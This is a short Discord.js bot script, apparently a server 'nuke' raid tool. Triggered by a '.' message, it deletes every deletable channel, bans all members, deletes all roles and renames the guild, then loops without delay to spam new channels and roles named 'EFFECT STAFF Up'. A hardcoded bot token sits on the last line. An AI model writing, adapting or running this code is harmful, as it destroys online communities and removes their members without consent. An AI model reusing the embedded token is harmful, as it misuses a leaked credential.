const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("EFFECT STAFF Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("EFFECT STAFF Up", "text");///////bo channel 
        message.guild.createChannel("EFFECT STAFF Up", "voice");////bo voice
        message.guild.createRole({ name: "EFFECT STAFF Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODE4Nzc0NDE2NjQwNTczNDYw.YEc9GQ.-_kzaRab0l_9_VZWv28aOT7Qr4c")
